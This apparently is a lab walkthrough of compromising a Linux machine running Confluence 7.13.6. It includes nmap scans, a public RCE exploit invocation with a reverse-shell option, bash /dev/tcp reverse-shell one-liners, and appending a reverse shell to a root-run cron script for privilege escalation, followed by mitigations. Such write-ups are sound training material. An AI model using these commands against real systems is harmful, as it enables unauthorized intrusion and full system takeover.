## Introduction

In this walkthrough, I targeted a Linux machine where ports 22 and 8090 were discovered open. Upon investigating port 8090, I identified an instance of Atlassian Confluence version 7.13.6. After researching known vulnerabilities, I found a publicly available exploit for this version and successfully gained initial access. During post-exploitation, I suspected a cron job might be running as root. I used `pspy` to monitor processes and confirmed this. By appending a reverse shell to the cron-executed script, I was able to escalate privileges and gain a root shell. Let's start ..

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open 
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 22

We usually skip SSH.

## Web

### Port 8090

- Version - Apache Tomcat (language: en)

## Exploitation

Navigating to website we are greeted with login screen where I tried `admin:admin` but it didn’t work. I saw a version of the software and found an exploit for it:

[https://github.com/jbaines-r7/through_the_wire](https://github.com/jbaines-r7/through_the_wire)

```bash
python3 through_the_wire.py --rhost 192.168.210.41 --rport 8090 --lhost 192.168.45.155 --protocol http:// --reverse-shell
```

Running the exploit script we are in:

We are the only user so we should do Privilege Escalation:

## Privilege Escalation

Let’s first get an interactive shell using bash:

```bash
bash -i >& /dev/tcp/192.168.45.155/8090 0>&1
```

I checked `sudo -l` but it requires password.

I see MySQL server running:

If you found `.sh` and want to check for if it is actually a cron job for the root user check:

1. `/etc/cron.d/` contents, as files here can run arbitrary commands and specify their own user
2. `/var/spool/cron/crontabs/root` - this is **root’s personal crontab**
3. Use `pspy` (if allowed) to **monitor running processes** and confirm if `/opt/log-backup.sh` is being executed by root.

Let’s run [pspy64](https://github.com/DominicBreuker/pspy)

After waiting a bit we can see that `.sh` file is run as cron job by root (UID=0):

And we own that file.

Let’s add a reverse shell there:

```bash
bash -i >& /dev/tcp/192.168.45.155/4444 0>&1
echo 'bash -i >& /dev/tcp/192.168.45.155/4444 0>&1' >> log-backup.sh
```

And we got a root shell.

## Mitigation

- **Update Confluence**: Upgrade Atlassian Confluence to the latest supported version, as version 7.13.6 is vulnerable to known remote code execution (RCE) exploits.
- **Restrict External Access**: Limit access to internal applications like Confluence using firewall rules or VPN-based access controls.
- **Harden Cron Jobs**: Ensure all scripts executed via cron are owned by root, non-writable by other users, and reside in secure directories.
- **Minimal User Privileges**: Ensure low-privileged users do not have write access to any files or directories used in scheduled tasks.
